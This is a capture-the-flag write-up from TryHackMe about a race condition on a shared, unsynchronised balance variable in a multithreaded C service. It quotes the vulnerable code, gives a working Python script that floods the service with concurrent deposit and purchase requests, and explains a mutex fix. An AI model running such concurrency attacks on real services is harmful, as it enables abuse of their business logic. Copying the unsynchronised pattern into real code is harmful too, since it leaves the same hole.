# Race Condition – Thread / Shared Memory

**Platform:** TryHackMe\

---

# Overview

In this lab we analyze a vulnerable network service that allows users to interact with a simple balance system.

The service supports three commands:

* `deposit`
* `withdraw`
* `purchase flag`

The intention is that a user must deposit enough money before purchasing the flag.

However, the program uses **multiple threads** and a **shared global variable** without any synchronization, which creates a race condition.

---

# Vulnerable Program

Below is the vulnerable source code used in the lab.

```c
int money;
```

The variable `money` is shared between all threads.

Each incoming connection creates a new thread:

```c
pthread_create(&thread, 0, run_thread, (void *) connection);
```

Inside each thread the program modifies the shared variable.

---

# Vulnerable Logic

Inside the thread handler:

```c
if (strstr(buffer, "deposit")) {
    money += 10000;
}
else if (strstr(buffer, "purchase flag")) {
    if (money >= 15000) {
        sendfile(conn->sock, open("/home/sprint/flag", O_RDONLY), 0, 128);
        money -= 15000;
    }
}
```

Later the program resets the balance:

```c
usleep(1);
money = 0;
```

The problem is that **multiple threads access and modify ****`money`**** at the same time**.

There is no:

* mutex
* lock
* synchronization

This means operations on `money` are not atomic.

---

# Race Condition

Multiple clients can connect to the service simultaneously.

Because the variable `money` is shared between threads, several operations may happen at the same time:

Example scenario:

1. Several threads execute `deposit`
2. The shared balance increases quickly
3. Another thread runs `purchase flag`
4. The flag is purchased before `money` is reset

This creates a **race condition between threads**.

---

# Exploitation Concept

To exploit the vulnerability, many connections are opened at the same time.

Some connections repeatedly send `deposit`, while others send `purchase flag`.

Example attack script:

```python
import socket
import multiprocessing

HOST = "127.0.0.1"
PORT = 1337

def send_command(cmd):
    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(cmd.encode())
    s.recv(4096)
    s.close()

def spam_deposit():
    while True:
        send_command("deposit")

def spam_purchase():
    while True:
        send_command("purchase flag")

if __name__ == "__main__":
    for _ in range(20):
        multiprocessing.Process(target=spam_deposit).start()

    for _ in range(10):
        multiprocessing.Process(target=spam_purchase).start()
```

By sending many concurrent requests, it becomes possible to purchase the flag before the balance is reset.

---

# Root Cause

The program uses a **shared global variable (****`money`****) across multiple threads without synchronization**.

Because of this, multiple threads can read and modify the variable at the same time.

This leads to inconsistent state and race conditions.

---

# Vulnerability Classification

* Race Condition
* Thread Race
* Shared Memory Race
* Missing Synchronization

---

# Mitigation

To fix this issue, access to the shared variable must be synchronized.

Example solution:

```
pthread_mutex_lock()
modify money
pthread_mutex_unlock()
```

Using a mutex ensures that only one thread can modify the balance at a time.

---

# Key Takeaways

* Shared variables across threads must be synchronized.
* Without locks or mutexes, concurrent access can lead to race conditions.
* Race conditions are not limited to filesystems; they also occur in multithreaded programs.
